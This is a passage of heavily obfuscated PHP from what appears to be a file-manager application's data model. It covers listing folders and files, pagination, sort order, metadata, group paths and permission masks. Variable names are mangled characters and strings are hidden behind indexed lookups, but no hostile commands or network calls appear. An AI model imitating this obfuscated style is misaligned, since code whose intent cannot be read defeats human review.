$àµ¦–Ñ·; } continue; } $¸ÙÙ™…ş[] = $‡­¬ƒÊ; } if ($¸ÙÙ™…ş) { $…æñù‚ = $this->listSource(array($…ß›øƒ[446] => array($…ß›øƒ[447], $¸ÙÙ™…ş))); } $…æñù‚ = $…æñù‚ ? $…æñù‚ : array($…ß›øƒ[82] => array(), $…ß›øƒ[83] => array()); $…æñù‚[$…ß›øƒ[82]] = array_merge($…æñù‚[$…ß›øƒ[82]], $ÎûÙ•¸å); $…æñù‚[$…ß›øƒ[83]] = array_merge($…æñù‚[$…ß›øƒ[83]], $À–˜Í©¨); if (isset($…æñù‚[$…ß›øƒ[395]]) && count($¸ÙÙ™…ş) == $…æñù‚[$…ß›øƒ[395]][$…ß›øƒ[396]]) { return $…æñù‚; } $Ş¿üùñ = array(); $Ç‘ËãØ = array_to_keyvalue($…æñù‚[$…ß›øƒ[82]], $…ß›øƒ[12], $…ß›øƒ[431]); $ìÖœŸ£ù = array_to_keyvalue($…æñù‚[$…ß›øƒ[83]], $…ß›øƒ[12], $…ß›øƒ[431]); $ˆ¼×Ù‰© = array_merge($ìÖœŸ£ù, $Ç‘ËãØ); foreach ($¸ÙÙ™…ş as $çÖ¦ÕİŠ) { if (!in_array($çÖ¦ÕİŠ, $ˆ¼×Ù‰©)) { $Ş¿üùñ[] = $çÖ¦ÕİŠ; } } if ($Ş¿üùñ) { Model($…ß›øƒ[457])->removeBySource($Ş¿üùñ); } return $…æñù‚; } public function listUserRecycle() { $‚ÆøûÚÒ =& $_SERVER[…É¦À–]; $¿›ßÜ’º = Model($‚ÆøûÚÒ[458])->listData(); if (!$¿›ßÜ’º) { return array(); } $Ùäßóğ± = array($‚ÆøûÚÒ[446] => array($‚ÆøûÚÒ[447], $¿›ßÜ’º), $‚ÆøûÚÒ[459] => 1); return $this->listSource($Ùäßóğ±); } public function listSource($òÔÔğæÅ, $ÙÀ³±ıê = 3000, $“ãç‘¾¹ = false) { $Ò¶Ù×õÉ =& $_SERVER[…É¦À–]; if (!isset($òÔÔğæÅ[$Ò¶Ù×õÉ[460]])) { $òÔÔğæÅ[$Ò¶Ù×õÉ[460]] = 0; } if (isset($òÔÔğæÅ[$Ò¶Ù×õÉ[461]]) && $òÔÔğæÅ[$Ò¶Ù×õÉ[461]] == $Ò¶Ù×õÉ[198]) { $òÔÔğæÅ[$Ò¶Ù×õÉ[441]] = array($Ò¶Ù×õÉ[360], $Ò¶Ù×õÉ[462]); } $úÑ¤Ôâ = $Ò¶Ù×õÉ[463]; $¾Ëˆï = $this->field($úÑ¤Ôâ)->_makeOrder()->where($òÔÔğæÅ)->selectPage($ÙÀ³±ıê); $this->_listPageCheck($¾Ëˆï, $úÑ¤Ôâ, $òÔÔğæÅ); $this->_listDataApply($¾Ëˆï[$Ò¶Ù×õÉ[398]], $“ãç‘¾¹); $this->_listMake($¾Ëˆï); return $¾Ëˆï; } private function _listPageCheck(&$¾ÓÊĞ¢™, $Åª§ó¶, $˜™ô€ı×) { $óş¢è† =& $_SERVER[…É¦À–]; if (!is_array($¾ÓÊĞ¢™[$óş¢è†[395]])) { return; } $ÔäÂàá‘ = $¾ÓÊĞ¢™[$óş¢è†[395]]; if ($ÔäÂàá‘[$óş¢è†[397]] <= 1) { return; } if ($ÔäÂàá‘[$óş¢è†[396]] >= 100000) { return; } if (Model($óş¢è†[464])->get($óş¢è†[465]) != $óş¢è†[466]) { return; } $Åª§ó¶ = str_replace(array($óş¢è†[53], $óş¢è†[371], $óş¢è†[231]), $óş¢è†[12], $Åª§ó¶); $Åª§ó¶ = $óş¢è†[467] . str_replace($óş¢è†[50], $óş¢è†[468], $Åª§ó¶) . $óş¢è†[469]; $šĞ ‰‹¼ = $óş¢è†[470]; $šĞ ‰‹¼ = $šĞ ‰‹¼ . $óş¢è†[471]; $Íß‘Ö—² = $ÔäÂàá‘[$óş¢è†[392]] * ($ÔäÂàá‘[$óş¢è†[382]] - 1) . $óş¢è†[50] . $ÔäÂàá‘[$óş¢è†[392]]; $Áİšèñ = $this->_makeOrder(!0); $«ãÊÀ ¨ = $óş¢è†[467] . str_replace($óş¢è†[50], $óş¢è†[468], $Áİšèñ[0]); if (strpos($«ãÊÀ ¨, $óş¢è†[472])) { $«ãÊÀ ¨ = str_replace($óş¢è†[472], $óş¢è†[473], $«ãÊÀ ¨); } else { $«ãÊÀ ¨ .= $óş¢è†[474] . $Áİšèñ[1]; } $œòÆİÉ‚ = array(); foreach ($˜™ô€ı× as $»Üó›î¶ => $…à×ÆâÆ) { $œòÆİÉ‚[$óş¢è†[467] . $»Üó›î¶] = $…à×ÆâÆ; } $this->alias($óş¢è†[475])->field($Åª§ó¶)->limit($Íß‘Ö—²)->order($«ãÊÀ ¨); $®Ğó« = $this->join($šĞ ‰‹¼)->where($œòÆİÉ‚)->select(); if ($®Ğó«) { $¾ÓÊĞ¢™[$óş¢è†[398]] = $®Ğó«; } } protected function _makeOrder($Çò°êÆò = false) { $¢šèè©¨ =& $_SERVER[…É¦À–]; $Î½„Î•è = Model($¢šèè©¨[476])->get($¢šèè©¨[477]); $Ä ¬§ß‚ = Model($¢šèè©¨[476])->get($¢šèè©¨[478]); $ö¦‹ØÁç = array($¢šèè©¨[479] => $¢šèè©¨[480], $¢šèè©¨[481] => $¢šèè©¨[482]); $Ë¥ÏÉËÆ = array($¢šèè©¨[32] => $¢šèè©¨[32], $¢šèè©¨[76] => $¢šèè©¨[76], $¢šèè©¨[174] => $¢šèè©¨[441], $¢šèè©¨[483] => $¢šèè©¨[483], $¢šèè©¨[484] => $¢šèè©¨[485], $¢šèè©¨[201] => $¢šèè©¨[201], $¢šèè©¨[85] => $¢šèè©¨[85]); $˜ÅÏæ¾ = Input::get($¢šèè©¨[486], $¢šèè©¨[7], $Î½„Î•è, array_keys($Ë¥ÏÉËÆ)); $¿ÙªÎÖ = Input::get($¢šèè©¨[487], $¢šèè©¨[7], $Ä ¬§ß‚, array_keys($ö¦‹ØÁç)); if (!in_array($˜ÅÏæ¾, array_keys($Ë¥ÏÉËÆ))) { $˜ÅÏæ¾ = $¢šèè©¨[32]; } if (!in_array($¿ÙªÎÖ, array_keys($ö¦‹ØÁç))) { $˜ÅÏæ¾ = $¢šèè©¨[479]; } if ($˜ÅÏæ¾ == $¢šèè©¨[32]) { } $Û¯ğ¿˜³ = $¢šèè©¨[488] . $Ë¥ÏÉËÆ[$˜ÅÏæ¾] . $¢šèè©¨[53] . $ö¦‹ØÁç[$¿ÙªÎÖ]; $Û¯ğ¿˜³ = rtrim(trim($Û¯ğ¿˜³), $¢šèè©¨[50]); if ($Çò°êÆò) { return array($Û¯ğ¿˜³, $ö¦‹ØÁç[$¿ÙªÎÖ]); } return $this->order($Û¯ğ¿˜³); } protected function _listDataApplyItem($‘ØÈƒ‘, $¸úÙäö¡ = false) { $¬Ù¬ı = array($‘ØÈƒ‘); $this->_listDataApply($¬Ù¬ı, $¸úÙäö¡); return $¬Ù¬ı[0]; } protected function _listDataApply(&$öêèßÂ, $¨®ºÆ¯ = false) { $Ú˜¢ëã¦ =& $_SERVER[…É¦À–]; if (!$öêèßÂ) { $öêèßÂ = array(); return; } $ëƒšî = array_to_keyvalue($öêèßÂ, $Ú˜¢ëã¦[12], $Ú˜¢ëã¦[431]); $ëƒšî = array_unique($ëƒšî); $this->_listSourceCache($öêèßÂ); if (!$¨®ºÆ¯) { $this->_listAppendMeta($öêèßÂ, $ëƒšî); $this->_listAppendFileMeta($öêèßÂ, $ëƒšî); $this->_listAppendChildren($öêèßÂ, $ëƒšî); } $this->_listAppendPath($öêèßÂ); $this->_listAppendAuth($öêèßÂ); $this->_listAppendSourceInfo($öêèßÂ, $ëƒšî); $this->_listAppendUser($öêèßÂ); $this->_listFilterInfo($öêèßÂ, $¨®ºÆ¯); $this->_listAppendAuthSecret($öêèßÂ); } protected function _listSourceCache($¶Úİı¡–) { $•ôÍ°¹¯ =& $_SERVER[…É¦À–]; foreach ($¶Úİı¡– as $¡öÔ‘îç) { self::$cacheSourceInfo[$•ôÍ°¹¯[489] . $¡öÔ‘îç[$•ôÍ°¹¯[431]]] = $¡öÔ‘îç; } } protected function _listFilterInfo(&$¶íá±, $¸Ì÷´˜‹ = false) { $˜¼òöò“ =& $_SERVER[…É¦À–]; foreach ($¶íá± as &$„˜€Âü¾) { $„˜€Âü¾ = $this->pathInfoFilter($„˜€Âü¾); self::$cachePathInfo[$˜¼òöò“[490] . intval($¸Ì÷´˜‹) . $˜¼òöò“[415] . $„˜€Âü¾[$˜¼òöò“[431]]] = $„˜€Âü¾; } unset($„˜€Âü¾); } protected function _listMake(&$Ö…ö•»ı) { $±œ‰¡ÚÜ =& $_SERVER[…É¦À–]; $Ö…ö•»ı[$±œ‰¡ÚÜ[82]] = array(); $Ö…ö•»ı[$±œ‰¡ÚÜ[83]] = array(); foreach ($Ö…ö•»ı[$±œ‰¡ÚÜ[398]] as $ƒ“÷†ğæ) { $¸‡”±Ë§ = $ƒ“÷†ğæ[$±œ‰¡ÚÜ[439]] == 1 ? $±œ‰¡ÚÜ[82] : $±œ‰¡ÚÜ[83]; $Ö…ö•»ı[$¸‡”±Ë§][] = $ƒ“÷†ğæ; } unset($Ö…ö•»ı[$±œ‰¡ÚÜ[398]]); } protected function _listAppendMeta(&$®± ·Úç, $è€¡ôËç) { $À©Óú´ =& $_SERVER[…É¦À–]; $¿„¾ó¨ = array($À©Óú´[446] => array($À©Óú´[447], $è€¡ôËç)); $ş×ù€á¸ = Model($À©Óú´[491])->field($À©Óú´[492])->where($¿„¾ó¨)->select(); if (!$ş×ù€á¸) { return; } $Ç‚ÛŒÓğ = array($À©Óú´[493], $À©Óú´[494], $À©Óú´[473]); $ßó‚ş×² = array(); foreach ($ş×ù€á¸ as $áÜ» €æ) { if (!isset($ßó‚ş×²[$áÜ» €æ[$À©Óú´[431]]])) { $ßó‚ş×²[$áÜ» €æ[$À©Óú´[431]]] = array(); } if (in_array($áÜ» €æ[$À©Óú´[94]], $Ç‚ÛŒÓğ)) { continue; } $ßó‚ş×²[$áÜ» €æ[$À©Óú´[431]]][$áÜ» €æ[$À©Óú´[94]]] = $áÜ» €æ[$À©Óú´[403]]; } foreach ($®± ·Úç as &$…šÀ¦¯Û) { $…šÀ¦¯Û[$À©Óú´[495]] = !1; if (isset($ßó‚ş×²[$…šÀ¦¯Û[$À©Óú´[431]]])) { $…šÀ¦¯Û[$À©Óú´[495]] = $ßó‚ş×²[$…šÀ¦¯Û[$À©Óú´[431]]]; } if ($this->fileIsLock($…šÀ¦¯Û) && $…šÀ¦¯Û[$À©Óú´[442]]) { $šŞ«şŞ¶ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $…šÀ¦¯Û[$À©Óú´[442]][$À©Óú´[443]] = AuthModel::authDisable($…šÀ¦¯Û[$À©Óú´[442]][$À©Óú´[443]], $šŞ«şŞ¶); $…šÀ¦¯Û[$À©Óú´[442]][$À©Óú´[496]][$À©Óú´[442]] = $…šÀ¦¯Û[$À©Óú´[442]][$À©Óú´[443]]; } } unset($…šÀ¦¯Û); } protected function _listAppendFileMeta(&$ãš ¬­³, $¸áÁæ ) { $§µ€ÄÁ =& $_SERVER[…É¦À–]; $¬µ¯• = array_to_keyvalue($ãš ¬­³, $§µ€ÄÁ[12], $§µ€ÄÁ[497]); $¬µ¯• = array_filter(array_unique($¬µ¯•)); if (!$¬µ¯•) { return; } $úµ·Ö· = array($§µ€ÄÁ[498] => array($§µ€ÄÁ[447], $¬µ¯•)); $”’¡éıâ = $§µ€ÄÁ[499]; $€Œõ®ÓŞ = Model($§µ€ÄÁ[500])->field($”’¡éıâ)->where($úµ·Ö·)->select(); $€Œõ®ÓŞ = array_to_keyvalue($€Œõ®ÓŞ, $§µ€ÄÁ[497]); $…‚’×›è = Model($§µ€ÄÁ[501])->field($§µ€ÄÁ[502])->where($úµ·Ö·)->select(); $…‚’×›è = $…‚’×›è ? $…‚’×›è : array(); $¬ß±öÁ = array(); foreach ($…‚’×›è as $ÙŒ¢¼»È) { if (!isset($¬ß±öÁ[$ÙŒ¢¼»È[$§µ€ÄÁ[497]]])) { $¬ß±öÁ[$ÙŒ¢¼»È[$§µ€ÄÁ[497]]] = array(); } $¬ß±öÁ[$ÙŒ¢¼»È[$§µ€ÄÁ[497]]][$ÙŒ¢¼»È[$§µ€ÄÁ[94]]] = $ÙŒ¢¼»È[$§µ€ÄÁ[403]]; } foreach ($ãš ¬­³ as &$ûãÛø¯ç) { $Ğ¬Ş›è = $ûãÛø¯ç[$§µ€ÄÁ[497]]; if (!$Ğ¬Ş›è || !is_array($€Œõ®ÓŞ[$Ğ¬Ş›è])) { continue; } $³úğ‰‚Æ = $€Œõ®ÓŞ[$Ğ¬Ş›è]; $³úğ‰‚Æ[$§µ€ÄÁ[76]] = $ûãÛø¯ç[$§µ€ÄÁ[76]]; $³úğ‰‚Æ[$§µ€ÄÁ[32]] = $ûãÛø¯ç[$§µ€ÄÁ[32]]; if (!isset(self::$cacheFileInfo[$§µ€ÄÁ[503] . $Ğ¬Ş›è])) { self::$cacheFileInfo[$§µ€ÄÁ[503] . $Ğ¬Ş›è] = array_merge(array(), $³úğ‰‚Æ); } unset($€Œõ®ÓŞ[$Ğ¬Ş›è][$§µ€ÄÁ[84]]); $á”èÕ‚À = is_array($¬ß±öÁ[$Ğ¬Ş›è]) ? $¬ß±öÁ[$Ğ¬Ş›è] : array(); $ûãÛø¯ç[$§µ€ÄÁ[170]] = array_merge($á”èÕ‚À, $€Œõ®ÓŞ[$Ğ¬Ş›è]); if (isset($ûãÛø¯ç[$§µ€ÄÁ[170]][$§µ€ÄÁ[169]])) { $ûãÛø¯ç[$§µ€ÄÁ[169]] = json_decode($ûãÛø¯ç[$§µ€ÄÁ[170]][$§µ€ÄÁ[169]], !0); unset($ûãÛø¯ç[$§µ€ÄÁ[170]][$§µ€ÄÁ[169]]); } } unset($ûãÛø¯ç); } protected function _listAppendSourceInfo(&$»»”•ç , $’‰ö·æˆ) { $ëÙÅçÀ® =& $_SERVER[…É¦À–]; $ãßâ¹õ¡ = Model($ëÙÅçÀ®[504])->listData(); $Ğ©ÔÙŞÂ = Model($ëÙÅçÀ®[454])->listData(); $Ù¸ƒ¥Î = Model($ëÙÅçÀ®[444])->listData(); $™Û½«é = Model($ëÙÅçÀ®[505])->listSimple(); $¼‹è¨÷ß = array_to_keyvalue($ãßâ¹õ¡, $ëÙÅçÀ®[428]); $ï•Îíôû = array_to_keyvalue_group($Ğ©ÔÙŞÂ, $ëÙÅçÀ®[84], $ëÙÅçÀ®[455]); $ËØÒÀš = array_to_keyvalue($Ù¸ƒ¥Î, $ëÙÅçÀ®[84]); $Ü Õ¥Ã™ = array_to_keyvalue_group($™Û½«é, $ëÙÅçÀ®[431]); foreach ($»»”•ç  as &$åáÌø‡”) { $åáÌø‡”[$ëÙÅçÀ®[87]] = array($ëÙÅçÀ®[506] => 0, $ëÙÅçÀ®[507] => 0, $ëÙÅçÀ®[508] => 0); if (isset($ËØÒÀš[$åáÌø‡”[$ëÙÅçÀ®[431]]])) { $åáÌø‡”[$ëÙÅçÀ®[87]][$ëÙÅçÀ®[509]] = 1; $åáÌø‡”[$ëÙÅçÀ®[87]][$ëÙÅçÀ®[510]] = $ËØÒÀš[$åáÌø‡”[$ëÙÅçÀ®[431]]][$ëÙÅçÀ®[32]]; } if ($ï•Îíôû && $¼‹è¨÷ß && isset($ï•Îíôû[$åáÌø‡”[$ëÙÅçÀ®[431]]])) { $åáÌø‡”[$ëÙÅçÀ®[87]][$ëÙÅçÀ®[511]] = array(); foreach ($ï•Îíôû[$åáÌø‡”[$ëÙÅçÀ®[431]]] as $İÈÚÄ¢˜) { $“¸½ğÄİ = $¼‹è¨÷ß[$İÈÚÄ¢˜]; $åáÌø‡”[$ëÙÅçÀ®[87]][$ëÙÅçÀ®[511]][] = array($ëÙÅçÀ®[512] => $“¸½ğÄİ[$ëÙÅçÀ®[428]], $ëÙÅçÀ®[449] => $“¸½ğÄİ[$ëÙÅçÀ®[32]], $ëÙÅçÀ®[513] => $“¸½ğÄİ[$ëÙÅçÀ®[514]]); } } if ($Ü Õ¥Ã™ && isset($Ü Õ¥Ã™[$åáÌø‡”[$ëÙÅçÀ®[431]]])) { $åáÌø‡”[$ëÙÅçÀ®[87]][$ëÙÅçÀ®[515]] = array(); foreach ($Ü Õ¥Ã™[$åáÌø‡”[$ëÙÅçÀ®[431]]] as $³Ì˜³¬ö) { $Íäâöé = $ëÙÅçÀ®[516]; if ($³Ì˜³¬ö[$ëÙÅçÀ®[517]] == $ëÙÅçÀ®[88]) { $Íäâöé .= $ëÙÅçÀ®[518]; } $åáÌø‡”[$ëÙÅçÀ®[87]][$ëÙÅçÀ®[515]] = array_field_key($³Ì˜³¬ö, explode($ëÙÅçÀ®[50], $Íäâöé)); } } } unset($åáÌø‡”); return $»»”•ç ; } protected function _listAppendChildren(&$é­íâÀ–, $×íéŞïî) { $İÉèÕ¹µ =& $_SERVER[…É¦À–]; $ôÖåÎ²Ñ = array(); $ÉâêºÍ¾ = array($İÉèÕ¹µ[207] => 0, $İÉèÕ¹µ[208] => 0); foreach ($é­íâÀ– as &$×Ë Ú¹Ï) { if (!$×Ë Ú¹Ï[$İÉèÕ¹µ[439]]) { continue; } $ôÖåÎ²Ñ[] = $×Ë Ú¹Ï[$İÉèÕ¹µ[431]]; } unset($×Ë Ú¹Ï); if (!$ôÖåÎ²Ñ) { return; } $±Ãâà õ = array($İÉèÕ¹µ[461] => array($İÉèÕ¹µ[7], $ôÖåÎ²Ñ), $İÉèÕ¹µ[460] => 0); $””çÃ×Ò = array($İÉèÕ¹µ[461], $İÉèÕ¹µ[439], $İÉèÕ¹µ[519] => $İÉèÕ¹µ[520]); $ÊÉáÜÕ = $this->field($””çÃ×Ò)->where($±Ãâà õ)->group($İÉèÕ¹µ[521])->select(); $®ËÉœı“ = array(); foreach ($ÊÉáÜÕ as $šïíş­†) { $˜ÊÄâíÍ = $šïíş­†[$İÉèÕ¹µ[461]]; $ò•ììóá = $šïíş­†[$İÉèÕ¹µ[439]] == $İÉèÕ¹µ[88] ? $İÉèÕ¹µ[208] : $İÉèÕ¹µ[207]; if (!isset($®ËÉœı“[$˜ÊÄâíÍ])) { $®ËÉœı“[$˜ÊÄâíÍ] = array($İÉèÕ¹µ[207] => 0, $İÉèÕ¹µ[208] => 0); } $®ËÉœı“[$˜ÊÄâíÍ][$ò•ììóá] += $šïíş­†[$İÉèÕ¹µ[520]]; } foreach ($é­íâÀ– as &$×Ë Ú¹Ï) { if (!$×Ë Ú¹Ï[$İÉèÕ¹µ[439]]) { continue; } $ÌÛŠ½µ = is_array($®ËÉœı“[$×Ë Ú¹Ï[$İÉèÕ¹µ[431]]]) ? $®ËÉœı“[$×Ë Ú¹Ï[$İÉèÕ¹µ[431]]] : $ÉâêºÍ¾; $×Ë Ú¹Ï[$İÉèÕ¹µ[208]] = $ÌÛŠ½µ[$İÉèÕ¹µ[208]]; $×Ë Ú¹Ï[$İÉèÕ¹µ[207]] = $ÌÛŠ½µ[$İÉèÕ¹µ[207]]; unset($×Ë Ú¹Ï[$İÉèÕ¹µ[441]]); } unset($×Ë Ú¹Ï); } protected function _listAppendAuth(&$•¥¶õˆ•) { $«—®È‚Ú =& $_SERVER[…É¦À–]; $›şœ§ğ = array(); foreach ($•¥¶õˆ• as $éêÔŸ¹å) { if ($éêÔŸ¹å[$«—®È‚Ú[440]] == self::TYPE_GROUP) { $›şœ§ğ[] = $éêÔŸ¹å[$«—®È‚Ú[431]]; } } if (!$›şœ§ğ) { return; } $¯Ç«— = array_to_keyvalue($•¥¶õˆ•, $«—®È‚Ú[431]); $‘ÃÁ‹©¶ = Model($«—®È‚Ú[522])->getSourceList($›şœ§ğ, $¯Ç«—); $Ÿõ³Òæ­ = $GLOBALS[$«—®È‚Ú[523]] == 1; foreach ($•¥¶õˆ• as $Œ¦ëñôå => &$éêÔŸ¹å) { $éêÔŸ¹å[$«—®È‚Ú[442]] = $‘ÃÁ‹©¶[$éêÔŸ¹å[$«—®È‚Ú[431]]]; if (!$éêÔŸ¹å[$«—®È‚Ú[442]] && $éêÔŸ¹å[$«—®È‚Ú[440]] == self::TYPE_GROUP) { $éêÔŸ¹å[$«—®È‚Ú[442]] = Action($«—®È‚Ú[524])->pathGroupAuthMake($éêÔŸ¹å[$«—®È‚Ú[525]]); if (!$éêÔŸ¹å[$«—®È‚Ú[442]] && !$Ÿõ³Òæ­) { $éêÔŸ¹å[$«—®È‚Ú[203]] = !1; $éêÔŸ¹å[$«—®È‚Ú[202]] = !1; } } if ($éêÔŸ¹å[$«—®È‚Ú[442]]) { $éêÔŸ¹å[$«—®È‚Ú[203]] = AuthModel::authCheckEdit($éêÔŸ¹å[$«—®È‚Ú[442]][$«—®È‚Ú[443]]); $éêÔŸ¹å[$«—®È‚Ú[202]] = AuthModel::authCheckView($éêÔŸ¹å[$«—®È‚Ú[442]][$«—®È‚Ú[443]]); } $this->groupPathDisplay($éêÔŸ¹å); } unset($éêÔŸ¹å); } public function _listAppendAuthSecret(&$÷÷¹Äè×) { $¥¹÷äµÓ =& $_SERVER[…É¦À–]; if (Model($¥¹÷äµÓ[464])->get($¥¹÷äµÓ[526]) != $¥¹÷äµÓ[88]) { return; } static $ºƒÊèÑ = false; if (!$ºƒÊèÑ) { $¢ÚÉ§Û„ = Model($¥¹÷äµÓ[527]); $ Í¥ö¦Ü = Model($¥¹÷äµÓ[528]); $ºƒÊèÑ = $ Í¥ö¦Ü->listData(); $ºƒÊèÑ = array_to_keyvalue($ºƒÊèÑ, $¥¹÷äµÓ[431]); $„“ŸæÁ¨ = json_decode(Model($¥¹÷äµÓ[464])->get($¥¹÷äµÓ[529]), !0); $„“ŸæÁ¨ = array_to_keyvalue($„“ŸæÁ¨, $¥¹÷äµÓ[428]); foreach ($ºƒÊèÑ as $ÆŠ•’û” => $Óˆïªí÷) { $Š¡€â´“ = $„“ŸæÁ¨[$Óˆïªí÷[$¥¹÷äµÓ[530]]]; if (!$Š¡€â´“) { $ Í¥ö¦Ü->remove($Óˆïªí÷[$¥¹÷äµÓ[428]]); unset($ºƒÊèÑ[$ÆŠ•’û”]); continue; } $€«á«È = $¢ÚÉ§Û„->listData($Š¡€â´“[$¥¹÷äµÓ[442]]); if (!$€«á«È) { $ Í¥ö¦Ü->remove($Óˆïªí÷[$¥¹÷äµÓ[428]]); unset($ºƒÊèÑ[$ÆŠ•’û”]); continue; } $Óˆïªí÷[$¥¹÷äµÓ[442]] = $€«á«È; $Óˆïªí÷[$¥¹÷äµÓ[531]] = $Š¡€â´“; $Óˆïªí÷[$¥¹÷äµÓ[532]] = Model($¥¹÷äµÓ[533])->getInfoSimpleOuter($Óˆïªí÷[$¥¹÷äµÓ[483]]); $ºƒÊèÑ[$ÆŠ•’û”] = $Óˆïªí÷; } } $‹Å¤Û£ş = USER_ID; $©Œ©¨ÀŒ = array(); $Ë Äœ‘¡ = $this->_listAppendPath($©Œ©¨ÀŒ, !0); foreach ($÷÷¹Äè× as $ÆŠ•’û” => &$Óˆïªí÷) { if (!is_array($Óˆïªí÷[$¥¹÷äµÓ[442]])) { continue; } if ($Óˆïªí÷[$¥¹÷äµÓ[440]] != $¥¹÷äµÓ[534]) { continue; } if (isset($ºƒÊèÑ[$Óˆïªí÷[$¥¹÷äµÓ[431]]])) { $À½»·ë° = $ºƒÊèÑ[$Óˆïªí÷[$¥¹÷äµÓ[431]]]; if (!is_array($Óˆïªí÷[$¥¹÷äµÓ[495]])) { $Óˆïªí÷[$¥¹÷äµÓ[495]] = array(); } $Óˆïªí÷[$¥¹÷äµÓ[495]][$¥¹÷äµÓ[535]] = $À½»·ë°[$¥¹÷äµÓ[530]]; $Óˆïªí÷[$¥¹÷äµÓ[442]][$¥¹÷äµÓ[536]] = $À½»·ë°; $Óˆïªí÷[$¥¹÷äµÓ[442]][$¥¹÷äµÓ[537]] = $Óˆïªí÷[$¥¹÷äµÓ[538]]; $Óˆïªí÷[$¥¹÷äµÓ[442]][$¥¹÷äµÓ[539]] = $¥¹÷äµÓ[88]; if ($À½»·ë°[$¥¹÷äµÓ[483]] != $‹Å¤Û£ş) { $Óˆïªí÷[$¥¹÷äµÓ[442]][$¥¹÷äµÓ[443]] = $Óˆïªí÷[$¥¹÷äµÓ[442]][$¥¹÷äµÓ[443]] & $À½»·ë°[$¥¹÷äµÓ[442]][$¥¹÷äµÓ[442]]; } continue; } $íšâİ•„ = $this->parentLevelArray($Óˆïªí÷[$¥¹÷äµÓ[540]]); $Ò’ÙÅ¨ = array_reverse($íšâİ•„); foreach ($Ò’ÙÅ¨ as $ı•¡ş‚ç => $Ğ³ÙÅãÔ) { if (!isset($ºƒÊèÑ[$Ğ³ÙÅãÔ])) { continue; } $À½»·ë° = $ºƒÊèÑ[$Ğ³ÙÅãÔ]; $Óˆïªí÷[$¥¹÷äµÓ[442]][$¥¹÷äµÓ[536]] = $À½»·ë°; if ($À½»·ë°[$¥¹÷äµÓ[483]] != $‹Å¤Û£ş) { $Óˆïªí÷[$¥¹÷äµÓ[442]][$¥¹÷äµÓ[443]] = $Óˆïªí÷[$¥¹÷äµÓ[442]][$¥¹÷äµÓ[443]] & $À½»·ë°[$¥¹÷äµÓ[442]][$¥¹÷äµÓ[442]]; } $¯³—‰ = $¥¹÷äµÓ[12]; $™çôäšÊ = count($íšâİ•„) - $ı•¡ş‚ç; for ($¤šÖ¸ìš = 0; $¤šÖ¸ìš < $™çôäšÊ; $¤šÖ¸ìš++) { if (!isset($Ë Äœ‘¡[$íšâİ•„[$¤šÖ¸ìš]])) { $¯³—‰ = $¥¹÷äµÓ[12]; break; } $¯³—‰ = $¯³—‰ . rtrim($Ë Äœ‘¡[$íšâİ•„[$¤šÖ¸ìš]], $¥¹÷äµÓ[8]) . $¥¹÷äµÓ[8]; } $Óˆïªí÷[$¥¹÷äµÓ[442]][$¥¹÷äµÓ[537]] = rtrim($¯³—‰, $¥¹÷äµÓ[8]) . $¥¹÷äµÓ[8]; break; } } unset($Óˆïªí÷); } public function groupPathDisplay(&$ù—ºËÓª) { $¤µ¦°ëå =& $_SERVER[…É¦À–]; if ($ù—ºËÓª[$¤µ¦°ëå[440]] != self::TYPE_GROUP) { return; } $¤¤³±™¨ = Model($¤µ¦°ëå[541])->getInfo($ù—ºËÓª[$¤µ¦°ëå[525]]); $ãŠ½¦¨ = $this->parentLevelArray($¤¤³±™¨[$¤µ¦°ëå[540]]); $ÍîÊÅ¹ = $¤µ¦°ëå[12]; foreach ($ãŠ½¦¨ as $¹Ñ±”–Å) { $ÑæÎêÙ™ = Model($¤µ¦°ëå[541])->getInfo($¹Ñ±”–Å); $ÍîÊÅ¹ .= $ÑæÎêÙ™[$¤µ¦°ëå[87]][$¤µ¦°ëå[431]] . $¤µ¦°ëå[50]; } $ù—ºËÓª[$¤µ¦°ëå[542]] = $¤¤³±™¨[$¤µ¦°ëå[461]]; $ù—ºËÓª[$¤µ¦°ëå[543]] = $¤¤³±™¨[$¤µ¦°ëå[540]]; $ù—ºËÓª[$¤µ¦°ëå[544]] = $¤¤³±™¨[$¤µ¦°ëå[545]]; $ù—ºËÓª[$¤µ¦°ëå[546]] = $ÍîÊÅ¹ . $¤¤³±™¨[$¤µ¦°ëå[87]][$¤µ¦°ëå[431]]; } protected function _listAppendPath(&$Ó”‰”»†, $²Ä‹øœû = false) { $½ŸıÓµş =& $_SERVER[…É¦À–]; static $†¬Òœª… = array(); $¸•œ¯Ñ× = array(); $Ãæ¨êà® = array(); if ($²Ä‹øœû) { return $†¬Òœª…; } foreach ($Ó”‰”»† as &$Æ–òÛŒ×) { $ĞìÔ¶ƒ = $Æ–òÛŒ×[$½ŸıÓµş[431]]; if ($Æ–òÛŒ×[$½ŸıÓµş[439]] == $½ŸıÓµş[88] && $Æ–òÛŒ×[$½ŸıÓµş[461]] != 0) { $†¬Òœª…[$ĞìÔ¶ƒ] = $Æ–òÛŒ×[$½ŸıÓµş[32]]; } if ($Æ–òÛŒ×[$½ŸıÓµş[439]] == $½ŸıÓµş[88] && $Æ–òÛŒ×[$½ŸıÓµş[461]] == 0 && !isset($†¬Òœª…[$ĞìÔ¶ƒ])) { $†¬Òœª…[$ĞìÔ¶ƒ] = $this->_listAppendPathRoot($Æ–òÛŒ×, array()); } if (isset($Ãæ¨êà®[$Æ–òÛŒ×[$½ŸıÓµş[540]]])) { continue; } $Ãæ¨êà®[$Æ–òÛŒ×[$½ŸıÓµş[540]]] = !0; $Ø½¿‡é¸ = $this->parentLevelArray($Æ–òÛŒ×[$½ŸıÓµş[540]]); foreach ($Ø½¿‡é¸ as $éµØ®¹Ò => $Ğ®ê¨í) { if (isset($†¬Òœª…[$Ğ®ê¨í])) { continue; } if ($éµØ®¹Ò == 0) { $†¬Òœª…[$Ğ®ê¨í] = $this->_listAppendPathRoot($Æ–òÛŒ×, $Ø½¿‡é¸); } if ($éµØ®¹Ò != 0) { $¸•œ¯Ñ×[] = $Ğ®ê¨í; } } } unset($Æ–òÛŒ×); $¸•œ¯Ñ× = array_unique($¸•œ¯Ñ×); if (count($¸•œ¯Ñ×) > 0) { $ò©è¦ŠÎ = array($½ŸıÓµş[446] => array($½ŸıÓµş[447], $¸•œ¯Ñ×)); if (count($¸•œ¯Ñ×) == 1) { $çœüÆ×ô = $this->sourceInfo($¸•œ¯Ñ×[0]); $äÓ”¾— = is_array($çœüÆ×ô) ? array($çœüÆ×ô) : !1; } else { $äÓ”¾— = $this->field($½ŸıÓµş[547])->where($ò©è¦ŠÎ)->select(); } if (!$äÓ”¾—) { $äÓ”¾— = array(); } foreach ($äÓ”¾— as $”êÑ–°£) { 